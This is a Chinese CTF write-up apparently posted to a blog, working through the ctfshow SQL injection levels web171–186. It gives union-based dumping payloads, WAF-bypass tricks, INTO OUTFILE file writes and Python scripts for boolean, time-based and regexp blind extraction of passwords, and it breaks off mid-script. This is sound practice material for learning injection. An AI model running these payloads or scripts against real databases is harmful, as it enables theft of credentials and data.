        <content type="html"><![CDATA[<h1 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h1><p><a href="https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/">注入学习</a></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262159528.png" alt="image-20220326215919454"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure><p>象征性测试下闭合方式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1正常</span><br><span class="line">1&#x27;异常</span><br><span class="line">1&quot;正常</span><br></pre></td></tr></table></figure><p>说明是单引号闭合,测试字段数,这里注意使用%23哦</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 3%23正常</span><br><span class="line">1&#x27; order by 4%23异常</span><br></pre></td></tr></table></figure><p>说明三个,查回显地方</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,2,3%23</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262202465.png" alt="image-20220326220256430"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262203899.png" alt="image-20220326220315862"></p><p>爆数据库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;union select 1,group_concat(schema_name),3 from information_schema.schemata%23</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262204734.png" alt="image-20220326220443697"></p><p>爆表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262205150.png" alt="image-20220326220540113"></p><p>爆字段名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;ctfshow_user&#x27;%23</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271016776.png" alt="image-20220327101643682"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union select 1,group_concat(username,password),3 from ctfshow_user%23</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271017854.png" alt="image-20220327101732815"></p><p>更简单的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; or 1%23</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301345625.png" alt="image-20220330134534509"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;-1&#x27; or 1%23&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure><h1 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301335972.png" alt="image-20220330133530883"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">$sql = &quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br><span class="line"></span><br><span class="line">//检查结果是否有flag</span><br><span class="line">    if($row-&gt;username!==&#x27;flag&#x27;)&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字段</span><br><span class="line">1&#x27; order by 3%23异常</span><br><span class="line">1&#x27; order by 2%23正常</span><br><span class="line"></span><br><span class="line">数据库</span><br><span class="line">1&#x27; union select 1,database()%23</span><br><span class="line">1&#x27;union select 1,group_concat(schema_name) from information_schema.schemata%23</span><br><span class="line"></span><br><span class="line">表名</span><br><span class="line">-1&#x27;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23#有两张表,第二张是这关的</span><br><span class="line"></span><br><span class="line">字段名</span><br><span class="line">-1&#x27;union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_user&#x27;%23</span><br><span class="line"></span><br><span class="line">数据</span><br><span class="line">-1&#x27;union select 1,group_concat(username,password) from ctfshow_user2%23</span><br></pre></td></tr></table></figure><p>新学的base64加密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27; union select 1,to_base64(password) from ctfshow_user2 where username=&quot;flag&quot;%23</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301358191.png" alt="image-20220330135800134"></p><h1 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407094914986.png" alt="image-20220407094914986"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">$sql = &quot;select id,username,password from ctfshow_user3 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br><span class="line"></span><br><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#x27;/flag/i&#x27;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>与上面差不多,换一个函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27; union select 1,hex(password),3 from ctfshow_user3 where username=&quot;flag&quot;%23</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407095103698.png" alt="image-20220407095103698"></p><h1 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407095244739.png" alt="image-20220407095244739"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/拼接sql语句查找指定ID用户</span><br><span class="line">$sql = &quot;select username,password from ctfshow_user4 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br><span class="line">sel</span><br><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#x27;/flag|[0-9]/i&#x27;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里返回一般不让有flag和数字,那么我们想办法替换一下,替换的思路将1-0数字用q~p替换，但本来的flag中一定也会有一些小写字母，这样的话就没办法分辨那个是原本的字母哪个是替换出来的。所以为了避免这个问题，将password首先hex一下，因为hex()函数的返回值中字母都是大写的，所以我们返回结果中的小写字母就是原来的数字，而大写字母就是原本的字符。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select &#x27;q&#x27;,(select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),&#x27;1&#x27;,&#x27;q&#x27;),&#x27;2&#x27;,&#x27;w&#x27;),&#x27;3&#x27;,&#x27;e&#x27;),&#x27;4&#x27;,&#x27;r&#x27;),&#x27;5&#x27;,&#x27;t&#x27;),&#x27;6&#x27;,&#x27;y&#x27;),&#x27;7&#x27;,&#x27;u&#x27;),&#x27;8&#x27;,&#x27;i&#x27;),&#x27;9&#x27;,&#x27;o&#x27;),&#x27;0&#x27;,&#x27;p&#x27;) from ctfshow_user4 where username=&#x27;flag&#x27;)--+</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407095715741.png" alt="image-20220407095715741"></p><p>在自己替换一下</p><p>盲注测试一下下</p><p>抓包发现向这个页面请求的数据</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407102847062.png" alt="image-20220407102847062"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and length(database())&gt;0%23</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407103005812.png" alt="image-20220407103005812"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and length(database())=0%23</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407103025956.png" alt="image-20220407103025956"></p><p>也就是说如果后面为真就返回admin,如果后面为假就不返回admin</p><h2 id="get有回显布尔无空格和逗号的脚本"><a href="#get有回显布尔无空格和逗号的脚本" class="headerlink" title="get有回显布尔无空格和逗号的脚本"></a>get有回显布尔无空格和逗号的脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload = 1&#x27;&amp;&amp;length((select(password)from(ctfshow_user4)where(id=26)))&gt;&#123;mid&#125;#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pwd_len</span>(<span class="params">url</span>):</span><br><span class="line">    head = <span class="number">1</span></span><br><span class="line">    tail = <span class="number">100</span></span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail ) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&quot;1&#x27;&amp;&amp;length((select(password)from(ctfshow_user4)where(id=26)))&gt;<span class="subst">&#123;mid&#125;</span>#&quot;</span></span><br><span class="line">        <span class="comment"># print(uname)</span></span><br><span class="line">        param = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;page&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;limit&#x27;</span>: <span class="string">&#x27;10&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.get(url=url,params=param)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">            ans = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># passwd长度为:45</span></span><br><span class="line">url=<span class="string">&quot;http://c0fd21f5-b919-4d9c-aac8-de4d325b3a8b.challenge.ctf.show/api/v4.php&quot;</span></span><br><span class="line">get_pwd_len(url)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = 1&#x27;&amp;&amp;ascii(substr((reverse(substr((select(password)from(ctfshow_user4)where(id=26))from(&#123;i&#125;))))from(&#123;j&#125;)))&gt;&#123;mid&#125;#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pwd</span>(<span class="params">url</span>):</span><br><span class="line">    ans = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">46</span>):</span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        j = <span class="number">46</span> - i</span><br><span class="line">        <span class="comment"># print(j)</span></span><br><span class="line">        head = <span class="number">32</span></span><br><span class="line">        tail = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> head &lt;tail:</span><br><span class="line">            mid = (head + tail) &gt;&gt; <span class="number">1</span> <span class="comment">#&gt;&gt;是位移运算符 右移一位就是除以二</span></span><br><span class="line">            payload = <span class="string">f&quot;1&#x27;&amp;&amp;ascii(substr((reverse(substr((select(password)from(ctfshow_user4)where(id=26))from(<span class="subst">&#123;i&#125;</span>))))from(<span class="subst">&#123;j&#125;</span>)))&gt;<span class="subst">&#123;mid&#125;</span>#&quot;</span></span><br><span class="line">            <span class="comment"># print(uname)</span></span><br><span class="line">            param = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: payload,</span><br><span class="line">                <span class="string">&#x27;page&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;limit&#x27;</span>: <span class="string">&#x27;10&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            res = requests.get(url=url,params=param)</span><br><span class="line">            <span class="comment"># print(res.text)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                head = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tail = mid</span><br><span class="line">        <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">            ans += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(ans)</span><br><span class="line">url=<span class="string">&quot;http://c0fd21f5-b919-4d9c-aac8-de4d325b3a8b.challenge.ctf.show/api/v4.php&quot;</span></span><br><span class="line">get_pwd(url)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>除了盲注还可以写文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/v4.php?id=1&#x27; union select 1,password from ctfshow_user4 into outfile &#x27;/var/www/html/1.txt&#x27;--+&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407130358634.png" alt="image-20220407130358634"></p><h1 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407124216316.png" alt="image-20220407124216316"></p><p>这次是直接没有回显了</p><h2 id="get时间盲注无空格和逗号的脚本"><a href="#get时间盲注无空格和逗号的脚本" class="headerlink" title="get时间盲注无空格和逗号的脚本"></a>get时间盲注无空格和逗号的脚本</h2><p>稍微修改一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pwd_len</span>(<span class="params">url</span>):</span><br><span class="line">    head = <span class="number">1</span></span><br><span class="line">    tail = <span class="number">100</span></span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail ) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&quot;1&#x27;&amp;&amp;if(length((select(password)from(ctfshow_user5)where(id=26)))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0)#&quot;</span></span><br><span class="line">        <span class="comment"># print(uname)</span></span><br><span class="line">        param = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;page&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;limit&#x27;</span>: <span class="string">&#x27;10&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.get(url=url,params=param)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url,params=param,timeout=<span class="number">0.5</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">            ans = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">            head = mid +<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># passwd长度为:45</span></span><br><span class="line">url=<span class="string">&quot;http://c7c6c7b5-e27e-46b5-ac09-66d7f0ede948.challenge.ctf.show/api/v5.php&quot;</span></span><br><span class="line">get_pwd_len(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pwd</span>(<span class="params">url</span>):</span><br><span class="line">    ans = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">46</span>):</span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        j = <span class="number">46</span> - i</span><br><span class="line">        <span class="comment"># print(j)</span></span><br><span class="line">        head = <span class="number">32</span></span><br><span class="line">        tail = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> head &lt;tail:</span><br><span class="line">            mid = (head + tail) &gt;&gt; <span class="number">1</span> <span class="comment">#&gt;&gt;是位移运算符 右移一位就是除以二</span></span><br><span class="line">            payload = <span class="string">f&quot;1&#x27;&amp;&amp;if(ascii(substr((reverse(substr((select(password)from(ctfshow_user5)where(id=26))from(<span class="subst">&#123;i&#125;</span>))))from(<span class="subst">&#123;j&#125;</span>)))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0)#&quot;</span></span><br><span class="line">            <span class="comment"># print(uname)</span></span><br><span class="line">            param = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: payload,</span><br><span class="line">                <span class="string">&#x27;page&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;limit&#x27;</span>: <span class="string">&#x27;10&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                res = requests.get(url=url,params=param,timeout=<span class="number">0.5</span>)</span><br><span class="line">                tail = mid</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">            ans += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(ans)</span><br><span class="line">url=<span class="string">&quot;http://c7c6c7b5-e27e-46b5-ac09-66d7f0ede948.challenge.ctf.show/api/v5.php&quot;</span></span><br><span class="line">get_pwd(url)</span><br></pre></td></tr></table></figure><p>这里有逗号,等研究研究在试试能不能去掉逗号</p><p>这里当然也可以写文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/v5.php?id=1&#x27; union select 1,password from ctfshow_user5 into outfile &#x27;/var/www/html/1.txt&#x27;--+&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><h1 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407130600142.png" alt="image-20220407130600142"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; or 1%23</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407130612382.png" alt="image-20220407130612382"></p><p>不知道过滤了啥</p><p>这里之前的不可以,但是大小写可以绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;uNion seleCt 1,groUp_concAt(username,password),3 frOm ctfshow_user%23</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407130913425.png" alt="image-20220407130913425"></p><h1 id="web177-179"><a href="#web177-179" class="headerlink" title="web177-179"></a>web177-179</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407131027613.png" alt="image-20220407131027613"></p><h2 id="空格的代替"><a href="#空格的代替" class="headerlink" title="空格的代替"></a>空格的代替</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;%09or%091%23TAB水平</span><br><span class="line">-1&#x27;%0aor%0a1%23新建一行</span><br><span class="line">-1&#x27;%0cor%0c1%23新建一页</span><br><span class="line">-1&#x27;%0dor%0d1%23return功能</span><br><span class="line">-1&#x27;%0bor%0b1%23TAB(垂直)</span><br><span class="line">%a0 空格 这里不行</span><br></pre></td></tr></table></figure><p>注释</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,group_concat(username,password),3/**/from/**/ctfshow_user%23</span><br></pre></td></tr></table></figure><p>括号</p><p>我也不会,自己研究怎么加括号吧</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union(select(1),(group_concat(username,password)),(3)from(ctfshow_user))%23</span><br></pre></td></tr></table></figure><p>反引号</p><p>我不懂但是可以实现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union/**/select`id`,`username`,`password`from`ctfshow_user`%23</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407131136762.png" alt="image-20220407131136762"></p><h1 id="web180-183"><a href="#web180-183" class="headerlink" title="web180-183"></a>web180-183</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407135553899.png" alt="image-20220407135553899"></p><h2 id="过滤注释符与空格"><a href="#过滤注释符与空格" class="headerlink" title="过滤注释符与空格"></a>过滤注释符与空格</h2><p>联合注入好像无法实现,反正我不会,如果没过滤其他空格可以实现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union%0cselect(1),(group_concat(username,password)),(3)from(ctfshow_user)where(1)and&#x27;1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;or(id=26)and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407140553761.png" alt="image-20220407140553761"></p><h1 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407141724604.png" alt="image-20220407141724604"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">  $sql = &quot;select count(pass) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;</span><br><span class="line">  </span><br><span class="line">  //对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">//返回用户表的记录总数</span><br><span class="line">      $user_count = 0;</span><br></pre></td></tr></table></figure><h2 id="regexp匹配like通配pwd"><a href="#regexp匹配like通配pwd" class="headerlink" title="regexp匹配like通配pwd"></a>regexp匹配like通配pwd</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_pwd</span>(<span class="params">url</span>):</span><br><span class="line">    dic=<span class="string">r&#x27;&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;&#x27;</span></span><br><span class="line">    ans =<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">46</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span>  dic:</span><br><span class="line">            <span class="comment">#flag=&quot;ctfshow&#123;&quot;</span></span><br><span class="line">            <span class="comment">#payload = f&quot;(ctfshow_user)where(pass)like&#x27;&#123;flag+j&#125;%&#x27;</span></span><br><span class="line">            payload =<span class="string">f&quot;(ctfshow_user)where(substr(pass,<span class="subst">&#123;i&#125;</span>,1))regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;)&quot;</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;tableName&#x27;</span>:payload</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url,data=data)</span><br><span class="line">            <span class="keyword">if</span> r.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">                ans += j</span><br><span class="line">                <span class="built_in">print</span>(ans)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://a4c677e5-0ca4-46f8-85da-961e108b532b.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">post_pwd(url)</span><br></pre></td></tr></table></figure><h1 id="web184-1"><a href="#web184-1" class="headerlink" title="web184"></a>web184</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> Author:feng</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://419f0650-7493-4fa7-81fe-82e04b0b6b7c.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">flag=<span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">str_to_hex</span>(s):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.<span class="title function_ invoke__">join</span>([<span class="title function_ invoke__">hex</span>(<span class="title function_ invoke__">ord</span>(c)).<span class="title function_ invoke__">replace</span>(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c in s])</span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j in <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span>:</span><br><span class="line">        data=&#123;</span><br><span class="line"><span class="comment">#&#x27;tableName&#x27;:&quot;ctfshow_user a inner join ctfshow_user b on b.pass like &#123;&#125;&quot;.format(&quot;0x&quot;+str_to_hex(flag+j+&quot;%&quot;))</span></span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>:f<span class="string">&quot;ctfshow_user group by pass having pass like &#123;&#x27;0x&#x27;+str_to_hex(flag+j+&#x27;%&#x27;)&#125;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.<span class="title function_ invoke__">post</span>(url=url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;<span class="subst">$user_count</span> = 1&quot;</span> in r:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="keyword">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                <span class="keyword">exit</span>()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>HAVING语句通常与GROUP BY语句联合使用，用来过滤由GROUP BY语句返回的记录集。<br> HAVING语句的存在弥补了WHERE关键字不能与聚合函数联合使用的不足。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> Author:Y4tacker</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://419f0650-7493-4fa7-81fe-82e04b0b6b7c.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt;= <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span>  j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>: <span class="string">f&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,<span class="subst">&#123;i&#125;</span>,1)regexp(char(<span class="subst">&#123;j&#125;</span>)))&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> r.text.find(<span class="string">&quot;$user_count = 43;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(j) != <span class="string">&quot;.&quot;</span>:</span><br><span class="line">                flag += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(flag.lower())</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">chr</span>(j) == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>RIGHT JOIN等同于RIGHT OUTER JOIN，右外连接，不满足ON条件的会保留右边那张表的数据，左边表数据直接显示NULL</p><h1 id="web185-186"><a href="#web185-186" class="headerlink" title="web185-186"></a>web185-186</h1><p>数字的表示哦</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407150732592.png" alt="image-20220407150732592"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> Author:Y4tacker</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bdd55ead-f197-4ec4-b304-8bf0dd687c8d.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span 